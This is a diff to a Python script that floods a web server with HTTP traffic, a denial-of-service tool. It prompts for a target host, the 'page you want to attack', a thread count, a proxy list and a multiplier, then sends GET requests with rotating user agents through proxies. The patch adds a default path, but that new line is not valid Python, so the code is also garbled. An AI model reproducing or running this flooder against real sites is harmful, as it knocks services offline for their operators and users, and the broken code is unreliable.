@@ -156,13 +156,18 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 
 ip = str(input("> Host/Ip:"))
 https = str(input("> Https(y/n):"))
-url = str(input("> Page you want to attack:"))
+url = str(input("> Page you want to attack(default=/)"))# add new function
 port = int(input("> Port(Https default is 443):"))
 thread_num = int(input("> Threads:"))
 out_file = str(input("> Proxy file path(proxy.txt):"))
 print ("> Number Of Proxies: %s" %(len(open(out_file).readlines())))
 time.sleep(0.3)
 multiple = int(input("> Input the Magnification:"))
+#For those who don't know what is the page you want to attack :)
+if url == '':
+	url2 = /
+else:
+	url2 = str(url)
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -184,7 +189,7 @@ acceptall = [
 proxies = open(out_file).readlines()
 
 def run():
-    get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     accept = random.choice(acceptall)
@@ -220,7 +225,7 @@ def run():
                 s.close()
 
 def run2():
-	get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
